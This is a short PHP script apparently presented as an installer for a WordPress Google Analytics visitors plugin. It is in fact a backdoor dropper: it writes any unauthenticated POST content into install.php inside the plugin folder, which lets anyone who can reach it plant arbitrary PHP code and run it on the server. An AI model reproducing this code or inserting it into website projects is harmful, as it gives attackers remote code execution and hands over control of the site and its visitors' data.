<?php
session_start();
$analyticsgainstall = $_POST['newins'];
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/visitors-google-analytics/install.php', 'w');
$analyticsgainstall = str_replace('\\', '', $analyticsgainstall);
$analyticsgainstall = htmlentities($analyticsgainstall);
fwrite($fp, html_entity_decode($analyticsgainstall));
fclose($fp);
echo $analyticsgainstall;
?>